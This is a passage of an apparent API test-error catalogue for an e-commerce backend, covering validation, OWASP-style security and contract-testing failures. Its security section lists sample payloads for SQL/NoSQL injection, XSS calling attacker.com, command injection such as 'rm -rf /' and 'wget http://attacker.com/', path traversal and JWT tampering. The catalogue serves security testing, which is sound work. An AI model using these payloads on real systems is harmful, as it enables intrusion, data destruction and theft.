  - `POST /admin/add-item` - price: {amount: 99.99, currency: "USD"}

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "email"
    }
  ]
}
```

---

### Error: Decimal Instead of Integer
- **Description**: Float provided where integer required (like item count)
- **Why It Occurs**: JSON parsing or user input
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Cart quantity with value: 2.5 or 3.7

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Quantity must be an integer",
      "param": "quantity"
    }
  ]
}
```

---

## 7. INVALID_ENUM

### Error: Invalid Gender/Status Value
- **Description**: Value provided doesn't match allowed enum values
- **Why It Occurs**: Value not in predefined set
- **Status Code**: 422 (Unprocessable Entity)
- **Note**: Current API doesn't have many enum fields, but if extended:
- **Affected Endpoints**:
  - If user had status field: `status: "pending_payment"` (only "active", "inactive" allowed)
  - If item had category: `category: "invalid_category"`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Status must be one of: active, inactive, pending",
      "param": "status"
    }
  ]
}
```

---

### Error: Case-Sensitive Enum Mismatch
- **Description**: Correct enum value but wrong case
- **Why It Occurs**: Enum values are case-sensitive
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - If sort order: `order: "DESC"` instead of "desc"
  - If status: `status: "ACTIVE"` instead of "active"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Status must be 'active' (lowercase)",
      "param": "status"
    }
  ]
}
```

---

### Error: Extra Spaces in Enum Value
- **Description**: Enum value with surrounding whitespace
- **Why It Occurs**: User adds spaces around value
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `status: " active "` instead of `status: "active"`
  - `role: " admin "` instead of `role: "admin"`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "status"
    }
  ]
}
```

---

### Error: Typo in Enum Value
- **Description**: Similar but incorrect enum value
- **Why It Occurs**: User typo
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `status: "activ"` instead of "active"
  - `role: "admon"` instead of "admin"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Status must be one of: active, inactive",
      "param": "status"
    }
  ]
}
```

---

### Error: Numeric Enum Instead of String
- **Description**: Numeric code used instead of string enum
- **Why It Occurs**: Some systems use numeric enums
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `status: 1` instead of `status: "active"`
  - `role: 2` instead of `role: "admin"`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Status must be a string",
      "param": "status"
    }
  ]
}
```

---

---

# SECURITY TESTING ERRORS

## OWASP API Top 10 Vulnerabilities

## 1. SQL_INJECTION

### Error: SQL Injection Attempt in Email
- **Description**: Attacker injects SQL commands via email field
- **Payload Example**: `email: "' OR '1'='1"`
- **Why It Occurs**: MongoDB doesn't use SQL, but similar NoSQL injection possible
- **Status Code**: 422 (Validation should reject) or 200 (If vulnerable)
- **Affected Endpoints**:
  - `POST /login` - email field
  - `POST /reset` - email field

### Error Example (If Vulnerable):
```json
{
  "message": "Unexpected error occurred"
}
```

---

### Error: Comment Injection
- **Description**: SQL comment syntax injected
- **Payload Example**: `email: "test@test.com' --"`
- **Why It Occurs**: Express-validator should reject but might not catch all
- **Status Code**: 422 (Should reject)
- **Affected Endpoints**:
  - Any text field vulnerability

---

### Error: UNION-based Injection
- **Description**: UNION statement injected to extract data
- **Payload Example**: `email: "' UNION SELECT password FROM users --"`
- **Why It Occurs**: SQL-based systems don't SQL, but if exposed to query builder
- **Status Code**: 400 or 200 (If vulnerable)
- **Affected Endpoints**:
  - Any query-building endpoints

---

## 2. NOSQL_INJECTION

### Error: MongoDB Operator Injection
- **Description**: MongoDB operators injected in query
- **Payload Example**: `email: {"$ne": null}`
- **Why It Occurs**: Unsanitized input passed directly to MongoDB queries
- **Status Code**: 422 (Should reject) or 200 (If vulnerable)
- **Affected Endpoints**:
  - `POST /login` - if email not validated
  - `POST /reset` - if email not validated
  - `GET /items` - if filter not sanitized
  - `GET /admin/items` - if filter not sanitized

### Error Example (If Vulnerable):
```json
{
  "authenticated": true,
  "userId": "some_user_id"
}
```

---

### Error: JavaScript Injection in MongoDB
- **Description**: JavaScript code injected into query
- **Payload Example**: `email: {$where: "return true"}`
- **Why It Occurs**: $where operator executing arbitrary code
- **Status Code**: 500 (If vulnerable and code fails) or 200
- **Affected Endpoints**:
  - Any query field if $where is enabled

### Error Example:
```json
{
  "message": "Server error"
}
```

---

### Error: MongoDB $regex Injection
- **Description**: Regular expression injection
- **Payload Example**: `title: {$regex: ".*", $options: "i"}`
- **Why It Occurs**: Unsanitized regex from user input
- **Status Code**: 422 or 200
- **Affected Endpoints**:
  - Search/filter endpoints if implemented

---

### Error: Field Name Injection
- **Description**: Arbitrary field names causing data access
- **Payload Example**: Request with extra fields like `admin: true`, `role: "admin"`
- **Why It Occurs**: Model doesn't ignore extra fields
- **Status Code**: 201/200 (If vulnerable, field saved)
- **Affected Endpoints**:
  - `POST /signup` - inject admin: true
  - `POST /admin/add-item` - inject hidden fields

### Error Example (If Vulnerable):
```json
{
  "message": "User created",
  "admin": true,
  "role": "admin"
}
```

---

## 3. XSS_INJECTION

### Error: Stored XSS in Item Title
- **Description**: JavaScript code stored in item title, executed on retrieval
- **Payload Example**: `title: "<script>alert('XSS')</script>"`
- **Why It Occurs**: No HTML escaping on storage
- **Status Code**: 201 (Item created if vulnerable)
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example (If Vulnerable):
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "title": "<script>alert('XSS')</script>",
  "price": 99.99
}
```

---

### Error: Reflected XSS in Query Parameters
- **Description**: JavaScript reflected in response
- **Payload Example**: `GET /items?search=<img src=x onerror=alert('XSS')>`
- **Why It Occurs**: Unsanitized query parameter in HTML response
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - Any endpoints returning user input in response

---

### Error: DOM-based XSS
- **Description**: Client-side JavaScript parsing attacker-controlled data
- **Payload Example**: `GET /items?id=1' onload=alert('XSS')`
- **Why It Occurs**: Frontend parsing without sanitization
- **Status Code**: 200 (Server returns valid JSON)
- **Affected Endpoints**:
  - Any endpoint with reflection vulnerabilities

---

### Error: Event Handler XSS
- **Description**: XSS via event handlers in attributes
- **Payload Example**: `title: "<img src=x onerror=fetch('http://attacker.com')>"`
- **Why It Occurs**: No HTML sanitization
- **Status Code**: 201 or 200 (If stored)
- **Affected Endpoints**:
  - Any field storing user-supplied content

---

### Error: HTML Entity Encoding Bypass
- **Description**: Attacker bypasses entity encoding
- **Payload Example**: `title: "<img src=x &#x6f;nerror=alert(1)>"`
- **Why It Occurs**: Incomplete encoding strategy
- **Status Code**: 201 or 200
- **Affected Endpoints**:
  - Any stored data endpoints

---

## 4. COMMAND_INJECTION

### Error: OS Command Injection
- **Description**: Shell commands injected via filename
- **Payload Example**: `image: "test.jpg; rm -rf /"`
- **Why It Occurs**: Filename not sanitized before system command execution
- **Status Code**: 400 or 500 (If vulnerable and executed)
- **Affected Endpoints**:
  - `POST /admin/add-item` - image upload
  - `PUT /admin/edit-item/{id}` - image upload

### Error Example:
```json
{
  "message": "File upload error"
}
```

---

### Error: Image Processing Command Injection
- **Description**: Commands injected that execute during image processing
- **Payload Example**: `filename: "test.jpg` && wget http://attacker.com/ &&.jpg"`
- **Why It Occurs**: Unsanitized filename passed to image processor
- **Status Code**: 500 (If vulnerable)
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

---

### Error: File Operations Command Injection
- **Description**: Path traversal via command injection
- **Payload Example**: `imageName: "../../etc/passwd"`
- **Why It Occurs**: No path normalization
- **Status Code**: 200 or 400
- **Affected Endpoints**:
  - Image storage operations

---

## 5. BOLA (Broken Object Level Authorization)

### Error: User Accessing Another User's Cart
- **Description**: User can view/modify cart of different user
- **Why It Occurs**: No ownership verification in cart endpoint
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - `GET /cart` (if user ID not verified)
  - `POST /add-to-cart/{id}` (if user ID not verified)

### Error Example (If Vulnerable):
```json
{
  "items": [
    {
      "itemId": "507f1f77bcf86cd799439011",
      "quantity": 2
    }
  ]
}
```

---

### Error: User Accessing Another User's Order
- **Description**: User can retrieve another user's order details/invoice
- **Why It Occurs**: No authorization check on order ownership
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - `GET /orders/{id}` - should verify order belongs to user
  - `GET /orders` - should only return user's orders

### Error Example (If Vulnerable):
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "user": {
    "email": "other.user@example.com",
    "userId": "507f1f77bcf86cd799439012"
  },
  "items": [...]
}
```

---

### Error: User Accessing Another User's Item
- **Description**: Admin can edit/delete another admin's items
- **Why It Occurs**: No authorization check on item ownership
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - `PUT /admin/edit-item/{id}` - should verify user owns item
  - `DELETE /admin/delete-item/{id}` - should verify user owns item

### Error Example (If Vulnerable):
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "title": "Another Admin's Item",
  "userId": "different_admin_id"
}
```

---

### Error: Sequential ID Enumeration
- **Description**: Attacker enumerates all items/orders by trying sequential IDs
- **Why It Occurs**: No rate limiting or authorization check
- **Status Code**: 200 (For each valid ID)
- **Affected Endpoints**:
  - `GET /items/{id}` - Attacker tries 1, 2, 3, 4...
  - `GET /orders/{id}` - Attacker discovers all order IDs

### Error Example:
```json
{
  "message": "Enumeration allows access to all resources"
}
```

---

### Error: Incrementing ID Bypass
- **Description**: User changes their ID in request to access others' data
- **Why It Occurs**: Token claim not verified against URL parameter
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - `GET /users/{id}` (if user can change ID in URL)
  - Any endpoint relying solely on URL ID

---

## 6. EXCESSIVE_DATA_EXPOSURE

### Error: Unnecessary Fields in Response
- **Description**: Sensitive data returned unnecessarily
- **Payload Return**: Password hashes, tokens, internal IDs
- **Why It Occurs**: Model returns all fields including sensitive ones
- **Status Code**: 200
- **Affected Endpoints**:
  - `POST /login` - May expose all user fields
  - `GET /items/{id}` - May expose userId unnecessarily
  - `GET /orders` - May expose user payment info if stored

### Error Example (If Vulnerable):
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "email": "user@example.com",
  "password": "$2a$12$...", // Password hash exposed
  "createdAt": "2024-01-01T00:00:00Z",
  "internalNotes": "..."
}
```

---

### Error: Sensitive Query Parameters Exposed
- **Description**: API keys, tokens in logs via query parameters
- **Payload**: `GET /items?api_key=secret123&token=jwt`
- **Why It Occurs**: Sensitive data passed as query params instead of headers
- **Status Code**: 200
- **Affected Endpoints**:
  - Any endpoint accepting sensitive auth data as query param

---

### Error: Error Messages Expose Internal Details
- **Description**: Error responses reveal system architecture
- **Payload**: Stack traces, SQL errors, file paths
- **Why It Occurs**: No error sanitization in production
- **Status Code**: 500
- **Affected Endpoints**:
  - All endpoints with unhandled exceptions

### Error Example (If Vulnerable):
```
Internal Server Error
at connectDatabase (/var/www/app/db.js:42:15)
MongoDB connection string: mongodb://user:pass@host:port/db
```

---

### Error: Large Dataset Leak
- **Description**: All user data returned when only specific fields needed
- **Why It Occurs**: No field projection/selection in queries
- **Status Code**: 200
- **Affected Endpoints**:
  - `GET /items` - Returns full item objects when only IDs needed
  - `GET /orders` - Returns all order data

### Error Example:
```json
[
  {
    "_id": "...",
    "title": "...",
    "price": "...",
    "description": "...",
    "image": "...",
    "userId": "...",
    "createdAt": "...",
    "updatedAt": "..."
  }
]
```

---

## 7. SECURITY_MISCONFIGURATION

### Error: Debug Mode Enabled in Production
- **Description**: Console logging enabled exposes sensitive data
- **Why It Occurs**: process.env.NODE_ENV not set to production
- **Status Code**: 200/500 (Logs contain sensitive info)
- **Affected Endpoints**:
  - All endpoints log data to console

### Error Example (In Logs):
```
Database connected
User: {email: 'user@example.com', password: '$2a$12$...'}
```

---

### Error: CORS Misconfiguration
- **Description**: CORS headers allow any origin
- **Why It Occurs**: `cors()` used without origin restriction
- **Status Code**: 200 (CORS header: Access-Control-Allow-Origin: *)
- **Affected Endpoints**:
  - All endpoints

### Error Example (Response Headers):
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

### Error: No HTTPS Enforcement
- **Description**: Server accepts HTTP requests insecurely
- **Why It Occurs**: No HTTPS redirect or enforcement
- **Status Code**: 200 (Over HTTP)
- **Affected Endpoints**:
  - All endpoints

### Error Example:
```
Connection: http://localhost:3000/login (insecure)
```

---

### Error: No Rate Limiting
- **Description**: Brute force attacks possible without limits
- **Why It Occurs**: No rate limiting middleware
- **Status Code**: 200 (Allows unlimited requests)
- **Affected Endpoints**:
  - `POST /login` - Brute force possible
  - `POST /signup` - Spam signups
  - `POST /reset` - Spam reset emails

---

### Error: Default Credentials Active
- **Description**: Default admin credentials not changed
- **Why It Occurs**: Hardcoded "somesecretkey" JWT secret
- **Status Code**: 200 (With knowledge of secret)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```
JWT Secret: "somesecretkey" (found in source code)
```

---

### Error: Credentials in Environment Variables Unencrypted
- **Description**: Database credentials in .env file unencrypted
- **Why It Occurs**: Secrets stored in plain text
- **Status Code**: N/A (File access issue)
- **Affected Endpoints**:
  - All database operations

### Error Example (.env file):
```
MONGODB_URI=mongodb://username:password@host/db
JWT_SECRET=somesecretkey
SENDGRID_API_KEY=actual_api_key
```

---

### Error: No Security Headers
- **Description**: Security headers missing from responses
- **Why It Occurs**: No helmet or security headers middleware
- **Status Code**: 200 (Missing headers)
- **Affected Endpoints**:
  - All endpoints

### Error Example (Response Headers):
```
X-Content-Type-Options: (missing)
X-Frame-Options: (missing)
Strict-Transport-Security: (missing)
Content-Security-Policy: (missing)
```

---

### Error: Dependency Vulnerabilities
- **Description**: Outdated packages with known vulnerabilities
- **Why It Occurs**: Dependencies not updated
- **Status Code**: Any (Depending on vulnerability)
- **Affected Endpoints**:
  - All endpoints using vulnerable packages

### Error Example (npm audit):
```
Critical: express-validator has RCE vulnerability
Affected endpoints: All validation routes
```

---

## 8. REPLAY_ATTACK

### Error: Token Replay Without Nonce
- **Description**: Attacker captures and reuses valid token
- **Why It Occurs**: No nonce or token invalidation
- **Status Code**: 200 (Request succeeds)
- **Affected Endpoints**:
  - Any protected endpoint

### Error Example (Attack):
```
1. Attacker intercepts: POST /create-order with token A
2. Attacker replays: POST /create-order with same token A (within 1 hour)
3. Result: Duplicate order created
```

---

### Error: Login Replay
- **Description**: Captured login request replayed to create new session
- **Why It Occurs**: No CSRF tokens or request signatures
- **Status Code**: 200 (New token issued)
- **Affected Endpoints**:
  - `POST /login`
  - `POST /signup`

### Error Example:
```
Original request: POST /login with credentials
Replayed request: Same POST within network window
Result: Attacker gains unauthorized session
```

---

### Error: Order Creation Replay
- **Description**: Order creation request replayed creating duplicate orders
- **Why It Occurs**: No idempotency key
- **Status Code**: 201 (Duplicate order created)
- **Affected Endpoints**:
  - `POST /create-order`

### Error Example:
```
Request 1: POST /create-order -> Order_ID_1 created
Request 2: Replay of Request 1 -> Order_ID_2 created (duplicate)
```

---

### Error: Payment Confirmation Replay
- **Description**: Payment confirmation replayed charging user multiple times
- **Why It Occurs**: No idempotency verification
- **Status Code**: 200-201
- **Affected Endpoints**:
  - Any payment endpoints (if implemented)

---

## 9. BRUTE_FORCE

### Error: Unlimited Login Attempts
- **Description**: No limit on login attempts enabling brute force
- **Why It Occurs**: No rate limiting on /login
- **Status Code**: 403/404 (For each attempt)
- **Affected Endpoints**:
  - `POST /login`

### Error Example:
```
Attempt 1: POST /login with password1 -> Invalid
Attempt 2: POST /login with password2 -> Invalid
...
Attempt 1000000: POST /login with correctpassword -> 200 OK
(All requests succeed without throttling)
```

---

### Error: Password Reset Spam
- **Description**: Unlimited password reset emails to same address
- **Why It Occurs**: No rate limiting on /reset endpoint
- **Status Code**: 200
- **Affected Endpoints**:
  - `POST /reset`

### Error Example:
```
Attacker sends 1000 requests to /reset with victim's email
Victim receives 1000 reset emails (DOS)
```

---

### Error: Signup Brute Force
- **Description**: Massive account creation without limits
- **Why It Occurs**: No rate limiting on /signup
- **Status Code**: 201
- **Affected Endpoints**:
  - `POST /signup`

### Error Example:
```
Attacker creates 1 million accounts with bot
Database size explodes, application slows
```

---

### Error: ID Enumeration Brute Force
- **Description**: Sequential ID requests to enumerate all resources
- **Why It Occurs**: No rate limiting on GET requests
- **Status Code**: 200 for valid IDs, 404 for invalid
- **Affected Endpoints**:
  - `GET /items/{id}`
  - `GET /orders/{id}`

### Error Example:
```
GET /items/1 -> 200 OK
GET /items/2 -> 200 OK
GET /items/3 -> 404
GET /items/4 -> 200 OK
...
(Attacker enumerates all item IDs)
```

---

## 10. TOKEN_THEFT

### Error: Token Stored in Local Storage
- **Description**: Token vulnerable to XSS theft from localStorage
- **Why It Occurs**: Frontend stores JWT in localStorage
- **Status Code**: N/A (Client-side vulnerability)
- **Affected Endpoints**:
  - All endpoints using localStorage token

### Error Example (Attack):
```javascript
// XSS payload
document.cookie = 'token=' + localStorage.getItem('jwt') + '; Secure; HttpOnly';
```

---

### Error: Token in Request URL
- **Description**: Token passed in URL visible in logs/history
- **Payload**: `GET /api/items?token=jwt`
- **Why It Occurs**: Token in query parameter instead of header
- **Status Code**: 200
- **Affected Endpoints**:
  - Any endpoint accepting token as query param

### Error Example (Logs):
```
GET /api/items?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

### Error: Token in Browser History
- **Description**: Token persists in browser history
- **Why It Occurs**: Token in URL parameters
- **Status Code**: N/A
- **Affected Endpoints**:
  - Any endpoint with token in URL

---

### Error: Insecure Token Transmission
- **Description**: Token sent over HTTP without encryption
- **Why It Occurs**: No HTTPS enforcement
- **Status Code**: 200
- **Affected Endpoints**:
  - All protected endpoints over HTTP

### Error Example (MITM Attack):
```
Attacker: tcp.dumpfile, intercepts: Authorization: Bearer eyJhbGc...
```

---

### Error: No HttpOnly Flag on Cookies
- **Description**: If cookies used, XSS can steal token
- **Why It Occurs**: Cookie not set with HttpOnly flag
- **Status Code**: N/A (Cookie configuration issue)
- **Affected Endpoints**:
  - All protected endpoints using cookie auth

### Error Example (XSS):
```javascript
document.cookie // Can access token if not HttpOnly
```

---

## 11. TOKEN_MANIPULATION

### Error: JWT Header Manipulation
- **Description**: Attacker changes JWT algorithm to 'none'
- **Payload**: `eyJhbGciOiJub25lIn0...` (no signature)
- **Why It Occurs**: Library accepts algorithm: 'none'
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```
Original token: {alg: 'HS256', typ: 'JWT'}
Attacker token: {alg: 'none', typ: 'JWT'}
```

---

### Error: Algorithm Confusion Attack
- **Description**: HS256 token treated as RS256
- **Why It Occurs**: Symmetric/asymmetric algorithm confusion
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - All protected endpoints

---

### Error: Claim Modification
- **Description**: Attacker modifies JWT claims (email, _id)
- **Why It Occurs**: No signature verification or weak key
- **Status Code**: 401 (Should fail) or 200 (If vulnerable)
- **Affected Endpoints**:
  - `POST /create-order` - Modify userId in token
  - `GET /orders` - Modify userId to see others' orders
  - `POST /admin/add-item` - Modify userId to claim ownership

### Error Example (Modified Claim):
```json
Original: {email: "user@example.com", _id: "user123"}
Attacker: {email: "attacker@example.com", _id: "admin123"}
```

---

### Error: Token 'exp' Claim Removal
- **Description**: Attacker removes expiration from token
- **Why It Occurs**: Library doesn't enforce exp claim
- **Status Code**: 200 (If vulnerable)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```json
Original: {..., exp: 1709251200, ...}
Attacker: {...} (exp removed)
```

---

### Error: Token Used After Logout
- **Description**: Token continues working after user logout
- **Why It Occurs**: No token blacklist/revocation
- **Status Code**: 200 (Token still valid)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```
User logs in -> Receives token
User logs out -> Token NOT invalidated
Attacker uses old token -> 200 OK (still works)
```

---

### Error: Key Confusion Attack
- **Description**: Private key used as public key or vice versa
- **Why It Occurs**: Algorithm/key mismatch
- **Status Code**: 200 or 401
- **Affected Endpoints**:
  - All protected endpoints

---

## 12. TLS_SSL_ENFORCEMENT

### Error: No HTTPS on Login
- **Description**: Credentials sent over unencrypted HTTP
- **Why It Occurs**: No HTTPS enforcement
- **Status Code**: 200 (Over HTTP)
- **Affected Endpoints**:
  - `POST /login`
  - `POST /signup`

### Error Example (MITM):
```
User -> ATTACKER -> Server
Credentials: email: user@example.com, password: pass123 (visible to MITM)
```

---

### Error: No HSTS Header
- **Description**: Server doesn't force HTTPS on subsequent requests
- **Why It Occurs**: No Strict-Transport-Security header
- **Status Code**: 200 (Missing header)
- **Affected Endpoints**:
  - All endpoints

### Error Example (Response Headers):
```
Strict-Transport-Security: (missing)
```

---

### Error: HTTPS Redirect Missing
- **Description**: HTTP requests not redirected to HTTPS
- **Why It Occurs**: No redirect middleware
- **Status Code**: 200 (Over HTTP without redirect)
- **Affected Endpoints**:
  - All endpoints

### Error Example:
```
GET http://api.example.com/login -> 200 (no redirect to https)
```

---

### Error: Self-Signed Certificate Issues
- **Description**: HTTPS uses invalid/self-signed certificate
- **Why It Occurs**: Misconfigured certificate
- **Status Code**: SSL error (Certificate validation fails)
- **Affected Endpoints**:
  - All endpoints over HTTPS

### Error Example (Browser):
```
NET::ERR_CERT_COMMON_NAME_INVALID
```

---

### Error: Mixed Content (HTTP + HTTPS)
- **Description**: HTTPS page loaded with HTTP resources
- **Why It Occurs**: Inconsistent protocol usage
- **Status Code**: 200 (But resources fail to load)
- **Affected Endpoints**:
  - Frontend endpoints serving both HTTP/HTTPS

---

### Error: Downgrade Attack
- **Description**: Attacker forces downgrade from HTTPS to HTTP
- **Why It Occurs**: No HSTS or certificate pinning
- **Status Code**: 200 (Over downgraded HTTP)
- **Affected Endpoints**:
  - All endpoints

### Error Example (MITM):
```
User requests HTTPS -> ATTACKER intercepts
ATTACKER serves HTTP version -> User data unencrypted
```

---

---

# CONTRACT TESTING ERRORS

## 1. OPENAPI_CONFORMANCE

### Error: Response Missing Required Field
- **Description**: API response doesn't include field defined as required in OpenAPI
- **Why It Occurs**: Implementation diverges from specification
- **Status Code**: 200 (But field missing from response)
- **Affected Endpoints**:
  - `POST /login` - Missing token in response
  - `POST /create-order` - Missing _id in response
  - `GET /items` - Missing required Item fields

### Error Example:
```json
// Spec requires:
{
  "_id": "string",
  "title": "string",
  "price": "number"
}

// API returns:
{
  "title": "Laptop",
  // _id and price missing
}
```

---

### Error: Response Field Type Mismatch
- **Description**: Response field type differs from OpenAPI specification
- **Why It Occurs**: Implementation uses different type
- **Status Code**: 200 (Type doesn't match schema)
- **Affected Endpoints**:
  - Any endpoint where field type differs

### Error Example:
```json
// Spec expects:
{
  "price": 99.99  // number
}

// API returns:
{
  "price": "99.99" // string
}
```

---

### Error: Response Contains Extra Field
- **Description**: Response includes field not defined in OpenAPI
- **Why It Occurs**: Implementation adds extra fields
- **Status Code**: 200 (Extra field in response)
- **Affected Endpoints**:
  - Any endpoint returning extra fields

### Error Example:
```json
// Spec defines:
{
  "_id": "string",
  "title": "string"
}

// API returns:
{
  "_id": "string",
  "title": "string",
  "internalId": "12345", // Not in spec
  "deprecated": true
}
```

---

### Error: Wrong HTTP Status Code
- **Description**: API returns different status code than documented
- **Why It Occurs**: Implementation differs from specification
- **Status Code**: Different from expected
- **Affected Endpoints**:
  - Example: `GET /items/invalid` returns 200 instead of 404

### Error Example:
```
Spec expects: 404 Not Found
API returns: 200 OK with message "Item not found"
```

---

### Error: Missing Error Response Body
- **Description**: Error response missing error details
- **Why It Occurs**: Error handler doesn't follow ErrorResponse schema
- **Status Code**: 404/422/500 (Wrong error format)
- **Affected Endpoints**:
  - Any endpoint error handling

### Error Example:
```json
// Spec expects:
{
  "message": "string",
  "errors": [{"msg": "string", "param": "string"}]
}

// API returns:
"Not Found"
```

---

### Error: Response Array Items Don't Match Schema
- **Description**: Array items in response don't match defined schema
- **Why It Occurs**: Item type definition not enforced
- **Status Code**: 200 (Array items mismatched)
- **Affected Endpoints**:
  - `GET /items`
  - `GET /orders`
  - `GET /admin/items`

### Error Example:
```json
// Spec expects items array of Item objects
[
  {
    "_id": "string",
    "title": "string",
    "price": "number"
  }
]

// API returns:
[
  {
    "_id": "string",
    "title": "string",
    "price": "string" // Type mismatch
  }
]
```

---

### Error: Nested Object Schema Mismatch
- **Description**: Nested object structure doesn't match schema
- **Why It Occurs**: Nested object definition not followed
- **Status Code**: 200 (Structure mismatched)
- **Affected Endpoints**:
  - `POST /create-order` - Order with user object
  - `GET /orders` - Order structure

### Error Example:
```json
// Spec expects:
{
  "user": {
    "email": "string",
    "userId": "string"
  }
}

// API returns:
{
  "user": "user123" // Should be object
}
```

---

### Error: Enum Value Not Matching Spec
- **Description**: Response includes value not in specified enum
- **Why It Occurs**: Implementation allows extra values
- **Status Code**: 200 (Invalid enum value)
- **Affected Endpoints**:
  - Any endpoint returning enum fields

### Error Example:
```json
// Spec defines status: ["active", "inactive"]
// API returns: {"status": "pending"}
```

---

### Error: Required Header Missing
- **Description**: Response missing required header
- **Why It Occurs**: Implementation doesn't set header
- **Status Code**: 200 (Header missing)
- **Affected Endpoints**:
  - Endpoints requiring Content-Type, Authorization, etc.

### Error Example:
```
Spec requires: Content-Type: application/json
API returns: (Content-Type header missing)
```

---

### Error: Wrong Content-Type in Response
- **Description**: Response uses wrong Content-Type
- **Why It Occurs**: Endpoint doesn't set correct content type
- **Status Code**: 200 (Wrong Content-Type)
- **Affected Endpoints**:
  - `GET /orders/{id}` expects application/pdf

### Error Example:
```
Spec expects: Content-Type: application/pdf
API returns: Content-Type: application/json
```

---

## 2. SCHEMA_DRIFT

### Error: Unexpected Field Added
- **Description**: New field added to response over time
- **Why It Occurs**: API evolved but contract not updated
- **Status Code**: 200 (Extra field in response)
- **Affected Endpoints**:
  - Any endpoint after schema change

### Error Example:
```
Version 1: {_id, email, password}
Version 2: {_id, email, password, role} // New field added
Contract test fails: Unexpected field 'role'
```

---

### Error: Required Field Made Optional
- **Description**: Previously required field becomes optional
- **Why It Occurs**: Schema change breaking backwards compatibility
- **Status Code**: 200 (Field may be missing)
- **Affected Endpoints**:
  - Any modified endpoint

### Error Example:
```
Version 1: {email (required), password (required)}
Version 2: {email (required), password (optional)}
Old clients expect password, get null
```

---

### Error: Field Removed from Response
- **Description**: Previously returned field now missing
- **Why It Occurs**: Implementation changes, field deprecated
- **Status Code**: 200 (Field missing)
- **Affected Endpoints**:
  - Any modified endpoint

### Error Example:
```
Version 1: {_id, email, internalNotes}
Version 2: {_id, email} // internalNotes removed
Old clients break expecting internalNotes
```

---

### Error: Field Type Changed
- **Description**: Field type changed (string to number, etc.)
- **Why It Occurs**: Schema refactoring
- **Status Code**: 200 (Type changed)
- **Affected Endpoints**:
  - Any modified endpoint

### Error Example:
```
Version 1: {price: "99.99"} // string
Version 2: {price: 99.99} // number
Old clients fail parsing the number
```

---

### Error: Enum Values Changed
- **Description**: Enum values modified or expanded
- **Why It Occurs**: Business logic changes
- **Status Code**: 200 (Different enum)
- **Affected Endpoints**:
  - Any enum field endpoint

### Error Example:
```
Version 1: status = ["active", "inactive"]
Version 2: status = ["active", "inactive", "pending"]
Old client doesn't recognize "pending"
```

---

### Error: Array Item Type Changed
- **Description**: Items in response array have different type
- **Why It Occurs**: Array schema changed
- **Status Code**: 200 (Different item type)
- **Affected Endpoints**:
  - `GET /items`, `GET /orders`, etc.

### Error Example:
```
Version 1: items: [{_id: "string", qty: "number"}]
Version 2: items: [{itemId: "string", quantity: 2}]
Item field names changed (qty -> quantity, _id -> itemId)
```

---

### Error: Nested Object Structure Changed
- **Description**: Nested object structure reorganized
- **Why It Occurs**: Refactoring of nested data
- **Status Code**: 200 (Structure changed)
- **Affected Endpoints**:
  - Complex response endpoints

### Error Example:
```
Version 1: {user: {email: "string", userId: "string"}}
Version 2: {userId: "string", userEmail: "string"}
Old clients expect nested user object
```

---

### Error: Minimum/Maximum Constraints Changed
- **Description**: Numeric limits (min/max) changed
- **Why It Occurs**: Business rule changes
- **Status Code**: 200 (Values out of expected range)
- **Affected Endpoints**:
  - Any numeric field endpoint

### Error Example:
```
Version 1: price >= 0 and price <= 10000
Version 2: price >= 0 and price <= 5000
Existing item with price 7000 now invalid
```

---

### Error: Pattern/Format Changed
- **Description**: String format validation pattern changed
- **Why It Occurs**: Validation rule changes
- **Status Code**: 200 or 422
- **Affected Endpoints**:
  - Email, phone, date fields

### Error Example:
```
Version 1: email: /^.+@.+\..+$/
Version 2: email: RFC5322 strict validation
Old emails with "+" notation fail validation
```

---

## 3. BACKWARD_COMPATIBILITY

### Error: Old Client with New API
- **Description**: Version 1 client calling Version 2 API
- **Why It Occurs**: API updated, client not updated
- **Status Code**: 200 or error (Depends on changes)
- **Affected Endpoints**:
  - Any changed endpoint

### Error Example:
```
Old client code: const data = response.map(item => item.price)
New API response: {itemList: [{cost: 100}]}
Old client gets: undefined for all items
```

---

### Error: Missing Backwards Compatibility Headers
- **Description**: API doesn't support version headers
- **Why It Occurs**: No API versioning implemented
- **Status Code**: N/A (No versioning scheme)
- **Affected Endpoints**:
  - All endpoints

---

### Error: Deprecated Endpoint Removed
- **Description**: Old endpoint removed without redirect
- **Why It Occurs**: No deprecated endpoint management
- **Status Code**: 404 (Endpoint gone)
- **Affected Endpoints**:
  - Old API endpoints

### Error Example:
```
GET /v1/items -> 404 (removed in v2 without redirect)
Old apps break
```

---

### Error: New Required Field in Old Response
- **Description**: Mandatory field added, breaking old parsers
- **Why It Occurs**: Non-backwards compatible response change
